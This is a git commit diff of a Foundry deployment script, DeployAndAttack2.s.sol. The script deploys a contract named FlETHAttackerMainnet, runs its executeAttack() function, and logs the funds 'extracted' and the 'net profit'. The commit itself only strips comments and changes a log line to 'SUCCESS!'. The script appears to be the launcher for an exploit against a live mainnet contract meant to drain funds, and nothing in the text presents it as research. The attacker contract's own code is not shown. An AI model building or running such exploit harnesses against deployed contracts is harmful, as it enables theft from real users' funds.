eb5b70916926b895f99917ac39442ee64bb58c6d
SHA2770 <134336163+DK27ss@users.noreply.github.com>
2025-11-12 19:53:40 +0100

    Update DeployAndAttack2.s.sol

--- DeployAndAttack2.s.sol
+++ DeployAndAttack2.s.sol
@@ -8,15 +8,11 @@ contract DeployAndAttack2 is Script {
     function run() external {
         vm.startBroadcast();
 
-        // Déployer le contrat
         FlETHAttackerMainnet attacker = new FlETHAttackerMainnet();
         console.log("Contract deployed at:", address(attacker));
 
-        // Exécuter l'attaque
         attacker.executeAttack();
-        console.log("Attack executed!");
-
-        // Vérifier les résultats
+        console.log("SUCCESS!");
         console.log("Total extracted:", attacker.totalExtracted());
         console.log("Net profit:", attacker.netProfit());
 
